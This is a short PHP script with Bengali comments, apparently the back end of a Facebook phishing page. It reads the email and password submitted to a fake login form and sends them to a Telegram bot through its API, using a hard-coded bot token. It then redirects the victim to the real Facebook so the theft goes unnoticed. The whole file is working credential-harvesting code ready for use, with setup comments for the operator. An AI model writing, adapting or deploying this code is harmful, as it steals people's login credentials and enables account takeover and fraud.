<?php
// তোমার দেওয়া টোকেনটি এখানে বসিয়েছি
$apiToken = "8163363937:AAGXRpXd1InBGab5dCv_E6R8-Ur2XJkpzaA";
// তোমার চ্যাট আইডি (এটি @userinfobot থেকে বের করে এখানে বসাও)
$chatId = "YOUR_CHAT_ID_HERE"; 

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $pass = $_POST['password'];

    $text = "🔥 New Facebook Login! 🔥\n\n📧 Email: $email\n🔑 Password: $pass";

    $url = "https://api.telegram.org/bot$apiToken/sendMessage?chat_id=$chatId&text=" . urlencode($text);

    // টেলিগ্রামে মেসেজ পাঠানো
    file_get_contents($url);

    // লগইন করার পর সরাসরি আসল ফেসবুকে নিয়ে যাবে
    header("Location: https://www.facebook.com");
    exit();
}
?>
